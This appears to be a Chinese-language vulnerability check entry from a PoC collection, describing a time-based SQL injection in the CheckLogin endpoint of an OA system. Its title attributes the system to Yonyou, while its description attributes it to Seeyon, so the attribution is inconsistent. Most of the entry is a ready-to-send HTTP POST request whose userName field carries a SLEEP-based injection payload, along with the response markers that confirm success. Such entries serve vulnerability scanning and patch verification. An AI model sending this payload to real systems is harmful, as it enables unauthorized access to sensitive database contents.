﻿# 用友 OA CheckLogin 存在SQL注入漏洞（延时注入测试）

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：北京致远互联软件股份有限公司 OA系统 CheckLogin 存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等。

> 漏洞特征：

> 验证脚本：HTTP

```
POST /yyoa/CheckLogin HTTP/1.1
Content-Type: application/x-www-form-urlencoded

userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(5)))sHcE) AND 'wert'='wert&loginit12=&password=
```

> 响应代码特征：-1

> 响应内容特征：登录名错误

> 上传文件定位：

> 验证文件来源：用友 OA CheckLogin 存在SQL注入漏洞.poc
